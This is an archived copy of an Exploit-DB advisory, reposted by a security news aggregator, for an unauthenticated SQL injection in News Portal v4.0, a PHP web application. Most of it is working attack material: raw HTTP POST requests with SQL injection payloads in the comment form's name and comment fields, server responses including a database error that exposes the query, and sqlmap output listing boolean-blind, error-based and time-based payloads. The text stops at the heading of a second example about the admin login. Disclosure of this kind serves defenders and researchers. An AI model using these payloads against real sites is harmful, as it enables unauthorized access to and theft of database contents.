@@ -1,0 +1,182 @@
+---
+title: [webapps] News Portal v4.0 - SQL Injection (Unauthorized)
+url: https://buaq.net/go-172126.html
+source: unSafe.sh - 不安全
+date: 2023-07-16
+fetch_date: 2025-10-04T11:51:16.052231
+---
+
+# [webapps] News Portal v4.0 - SQL Injection (Unauthorized)
+
+* [unSafe.sh - 不安全](https://unsafe.sh)
+* [我的收藏](/user/collects)
+* [今日热榜](/?hot=true)
+* [公众号文章](/?gzh=true)
+* [导航](/nav/index)
+* [Github CVE](/cve)
+* [Github Tools](/tools)
+* [编码/解码](/encode)
+* [文件传输](/share/index)
+* [Twitter Bot](https://twitter.com/buaqbot)
+* [Telegram Bot](https://t.me/aqinfo)
+* [Search](/search/search)
+
+[Rss](/rss.xml)
+
+[ ]
+黑夜模式
+
+![]()
+
+[webapps] News Portal v4.0 - SQL Injection (Unauthorized)
+
+*2023-7-15 08:0:0
+Author: [www.exploit-db.com(查看原文)](/jump-172126.htm)
+阅读量:16
+收藏*
+
+---
+
+#### Platform:
+
+###### [PHP](https://www.exploit-db.com/?platform=php)
+
+#### Date:
+
+###### 2023-07-15
+
+```
+# Exploit Title: News Portal v4.0 - SQL Injection (Unauthorized)
+# Date: 09/07/2023
+# Exploit Author: Hubert Wojciechowski
+# Contact Author: [email protected]
+# Vendor Homepage: https://phpgurukul.com/news-portal-project-in-php-and-mysql/c
+# Software Link: https://phpgurukul.com/?sdm_process_download=1&download_id=7643
+# Version: 4.0
+# We are looking for work security engineer, security administrator: https://www.pracuj.pl/praca/security-engineer-warszawa-plocka-9-11,oferta,1002635314
+# Testeted on: Windows 10 using XAMPP, Apache/2.4.48 (Win64) OpenSSL/1.1.1l PHP/7.4.23
+
+## Example  1
+-----------------------------------------------------------------------------------------------------------------------
+Param: name, email, comment
+-----------------------------------------------------------------------------------------------------------------------
+Req
+-----------------------------------------------------------------------------------------------------------------------
+POST /newsportal/news-details.php?nid=13 HTTP/1.1
+Origin: http://127.0.0.1
+Sec-Fetch-User: ?1
+Host: 127.0.0.1:80
+Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+Accept-Encoding: gzip, deflate
+Sec-Fetch-Site: same-origin
+sec-ch-ua-mobile: ?0
+Content-Length: 277
+Sec-Fetch-Mode: navigate
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+Connection: close
+Referer: http://127.0.0.1/newsportal/news-details.php?nid=13
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+sec-ch-ua-platform: "Windows"
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
+Sec-Fetch-Dest: document
+
+csrftoken=400eb8ae07c6693e68d5f0f5b76920fff294c09d33e70526c7708609a51956dd&name=(SELECT%20(CASE%20WHEN%20(8137%3d6474)%20THEN%200x73647361646173646173%20ELSE%20(SELECT%206474%20UNION%20SELECT%201005)%20END))''&email=admin%40local.host&comment=ssssssssssssssssssssssssss&submit
+-----------------------------------------------------------------------------------------------------------------------
+Res:
+-----------------------------------------------------------------------------------------------------------------------
+HTTP/1.1 200 OK
+Date: Sun, 09 Jul 2023 10:55:26 GMT
+Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
+X-Powered-By: PHP/8.1.17
+Set-Cookie: PHPSESSID=l7dg3s1in50ojjigs4vm2p0r9s; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Content-Length: 146161
+
+<script>alert('comment successfully submit. Comment will be display after admin review ');</script>
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>News Portal | Home Page
+	[...]
+
+-----------------------------------------------------------------------------------------------------------------------
+Req
+-----------------------------------------------------------------------------------------------------------------------
+POST /newsportal/news-details.php?nid=13 HTTP/1.1
+Origin: http://127.0.0.1
+Sec-Fetch-User: ?1
+Host: 127.0.0.1:80
+Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+Accept-Encoding: gzip, deflate
+Sec-Fetch-Site: same-origin
+sec-ch-ua-mobile: ?0
+Content-Length: 276
+Sec-Fetch-Mode: navigate
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+Connection: close
+Referer: http://127.0.0.1/newsportal/news-details.php?nid=13
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+sec-ch-ua-platform: "Windows"
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
+Sec-Fetch-Dest: document
+
+csrftoken=400eb8ae07c6693e68d5f0f5b76920fff294c09d33e70526c7708609a51956dd&name=(SELECT%20(CASE%20WHEN%20(8137%3d6474)%20THEN%200x73647361646173646173%20ELSE%20(SELECT%206474%20UNION%20SELECT%201005)%20END))'&email=admin%40local.host&comment=ssssssssssssssssssssssssss&submit
+-----------------------------------------------------------------------------------------------------------------------
+Res:
+-----------------------------------------------------------------------------------------------------------------------
+HTTP/1.1 200 OK
+Date: Sun, 09 Jul 2023 10:56:06 GMT
+Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
+X-Powered-By: PHP/8.1.17
+Set-Cookie: PHPSESSID=fcju4nb9mr2tu80mqv5cnduldk; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 525
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '[email protected]','ssssssssssssssssssssssssss','0')' at line 1 in C:\xampp3\htdocs\newsportal\news-details.php:21
+Stack trace:
+#0 C:\xampp3\htdocs\newsportal\news-details.php(21): mysqli_query(Object(mysqli), 'insert into tbl...')
+#1 {main}
+  thrown in <b>C:\xampp3\htdocs\newsportal\news-details.php</b> on line <b>21</b><br />w
+-----------------------------------------------------------------------------------------------------------------------
+SQLMap example param 'comment':
+-----------------------------------------------------------------------------------------------------------------------
+sqlmap identified the following injection point(s) with a total of 450 HTTP(s) requests:
+---
+Parameter: #2* ((custom) POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: csrftoken=400eb8ae07c6693e68d5f0f5b76920fff294c09d33e70526c7708609a51956dd&name=sdsadasdas&[email protected]&comment=ssssssssssssssssssssssssss' RLIKE (SELECT (CASE WHEN (3649=3649) THEN 0x7373737373737373737373737373737373737373737373737373 ELSE 0x28 END)) AND 'xRsB'='xRsB&submit=
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: csrftoken=400eb8ae07c6693e68d5f0f5b76920fff294c09d33e70526c7708609a51956dd&name=sdsadasdas&[email protected]&comment=ssssssssssssssssssssssssss' OR (SELECT 6120 FROM(SELECT COUNT(*),CONCAT(0x71787a7671,(SELECT (ELT(6120=6120,1))),0x7170717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'odEK'='odEK&submit=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: csrftoken=400eb8ae07c6693e68d5f0f5b76920fff294c09d33e70526c7708609a51956dd&name=sdsadasdas&[email protected]&comment=ssssssssssssssssssssssssss' AND (SELECT 1610 FROM (SELECT(SLEEP(5)))mZUx) AND 'bjco'='bjco&submit=
+---
+web application technology: PHP 8.1.17, Apache 2.4.56
+bacck-end DBMS: MySQL >= 5.0 (MariaDB fork)
+
+## Example 2 - login to administration panel
+-------------------------------------------------------------------...
